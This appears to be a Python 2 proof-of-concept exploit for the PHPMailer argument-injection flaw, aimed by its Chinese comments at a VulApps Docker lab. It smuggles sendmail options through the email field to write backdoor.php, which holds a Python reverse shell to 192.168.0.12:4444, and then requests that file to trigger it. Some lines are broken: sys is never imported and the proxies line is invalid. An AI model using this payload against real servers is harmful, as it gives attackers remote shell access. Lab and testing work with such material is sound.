#!/usr/bin/env python
# -*- coding:utf-8 -*-
#python version 2.7.14
#简介:脚本适用于docker下的vulapps环境，使用docker run -d -p 8000:80 medicean/vulapps:p_phpmailer_1启动环境
#详情参见github地址：https://github.com/Medicean/VulApps/commit/09c88c5f4390b293f3de82fbdd39e360b557ad73
#将poc下载至linux系统桌面下
#此处ip为：192.168.109.141







from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh
 
 
argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.141"
port = 8010

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
target = 'http://'+ip+':'+port
backdoor = '/backdoor.php'
 
payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.12\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @protonmail.com',
        'message': 'Pwned'}
 
m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')
 
headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}
 
proxies = {'http': ip':'port, 'https':ip':'port}
 
 
print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
